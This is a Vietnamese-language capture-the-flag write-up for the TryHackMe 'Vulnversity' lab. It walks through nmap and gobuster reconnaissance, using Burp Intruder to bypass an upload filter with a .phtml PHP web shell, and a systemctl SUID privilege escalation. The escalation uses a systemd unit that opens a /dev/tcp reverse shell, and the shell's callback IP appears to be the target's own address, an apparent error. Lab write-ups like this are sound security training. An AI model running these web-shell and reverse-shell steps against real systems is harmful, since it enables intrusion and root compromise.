# Vulnversity

## 1. Deploy machine
-.- Ấn deploy là được mà bro
## 2. Reconnaissance
Thu thập thông tin về machine dùng công cụ network scanning `Nmap` 
![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-00-19-46.png)
```
nmap -sV -sC 10.10.46.196
```
Trong đó :
+ -sV: là xác định các service
+ -sC: chạy các script scan mặc định của nmap
+ -p-400: số port nmap quét
+ -n: không resolve ra dns

Từ đó trả lời các câu hỏi.
+ Scan the box, how many ports are open? : 6
+ What version of the squid proxy is running on the machine? 3.5.12
+ How many ports will nmap scan if the flag -p-400 was used? 400
+ Using the nmap flag -n what will it not resolve? DNS
+ What is the most likely operating system this machine is running? Ubuntu (Thấy các dịch vụ chạy của Ubuntu)
+ What port is the web server running on? : 3333. (Ta thấy có Apache httpd)

## 3. Locating directories using GoBuster
Sử dụng tool `gobuster` để tìm directory của các thư mục.
Trong kali linux thì sẽ có wordlist có sẵn ở thư mục : `/usr/share/wordlists/dirbs/common.txt` (tuy nhiên ở đây mình dùng ubuntu, tải wordlist tại: https://github.com/3ndG4me/KaliLists/tree/master/dirb )

Chạy command : 

```
gobuster dir -u http://10.10.46.196:3333 -w /usr/share/wordlists/dirbs/common.txt
```
Trong đó:
+ -u : target URL
+ -w : địa chỉ wordlist
![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-00-35-10.png)
=> kết quả là tìm được url : `/internal/` => truy cập được trang uploads file
## 4. Compromise the webserver
Sử dụng burpsuite community để bắt request và tìm ra extension có thể upload được file lên, mục đích là upload được file shell lên để RCE.

+ Truy cập trang : http://10.10.46.196:3333/internal
![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-00-38-55.png)
+ Ấn upload file và dừng ở POST request (intercept is on):
![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-00-40-27.png)
+ Chuột phải chọn : `Intruder` (Là trang mà ta có thể bruteforce để tìm ra extension phù hợp) => `Clear$` => bôi đen phần extension của file vừa up lên => `Add$`
![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-00-43-34.png)
+ Trang Payloads : thê những extension : `.php`, `.php2`, `.php3`. `.php5`, `.phtml`
![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-00-44-56.png)
+ Start attack:
![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-00-45-31.png)
Chú ý phần kết quả length của `phtml` khác so với phần còn lại (Do trả về chữ success nhỏ hơn chữ Extension not allowed) => có thể upload file `.phtml`

Bước 1 : chuẩn bị file hehe.phtml
```
<?php
    system($_GET('cmd'));
?>
```
Sau khi upload thành công, truy cập bằng đường dẫn :
```
http://10.10.46.196:3333/internal/uploads/hehe.phtml?cmd=cat /etc/passwd
```
Bước 2 : Thực ra phải tải file shell php của tryhackme gợi ý để có thể RCE bằng netcat
+ Tải file và sửa phần 'CHANGE THIS'
+ Sau đó dùng netcat để nghe trên port '1234':
```
nc -lvnp 1234
```
+ Truy cập vào đường dẫn `http://10.10.46.196:3333/internal/uploads/hehe.phtml` để kích hoạt shell.
+ Quay lại trên trình duyệt và gõ  `cat /etc/passwd`
## 5. Privilege Escalation
*Phần này là phần hay nhất :V*

Ngoài các quyền đặc biệt r, w, x còn có `special permission` đó là : SUID, SGID và sticky bits. Trong bài này dùng SUID.

SUID thường được sử dụng trên các file thực thi. Các file nào có bit `s` thì có thể thực hiện với quyền là chủ sở hữu của file đó.
Ví dụ: file sở hữu bởi root và được set SUID bit, thì bất kể ai thực thi file đó luôn chạy dưới quyền root.
+ Câu lệnh để tìm tất cả các file có SUID:
```
find / -perm -u=s -type f 2>/dev/null
```
Ta được kết quả:

![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-01-13-50.png)
+ Và thử :
```
passwd bill
or
passwd
```
Thì không được là do `whoami` đang là www-data, và passwd chỉ có thể dùng được khi bạn à root hoặc là chủ sở hữu của user đó.
=> `/bin/systemctl`

Source chưa các file có thể RCE : https://gtfobins.github.io/

Chạy lệnh ở máy host để lắng nghe ở port 4444:
```
nc -lvnp 4444
```
+ Tạo service chạy dưới systemd với tên `hehe.service`
```
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.46.196/4444 0>&1'
[Install]
WantedBy=multi-user.target
```
    + `/bin/bash -c` : thực thi shell
    + `bash -i >& /dev/tcp/10.10.46.196/4444 0>&1` : Reverse shell (trong reference)
+ Chạy lệnh
```
systemctl enable /tmp/hehe.service
systemctl start hehe.service
```
+ Quay lại máy host :D và :
```
cat /root/root.txt
```
![](https://github.com/dangdh16/OSCP/blob/main/Level_3_/TryHackMe/img/2021-08-31-01-24-08.png)

Done

--- 
> Author : dangdh11

> Reference :
> 
Reverse shell : https://www.netsparker.com/blog/web-security/understanding-reverse-shells/
https://hackersploit.org/netcat-tutorials/
https://vinasupport.com/systemd-la-gi-huong-dan-tao-va-quan-ly-systemd-services-tren-linux/
https://gtfobins.github.io/gtfobins/systemctl/
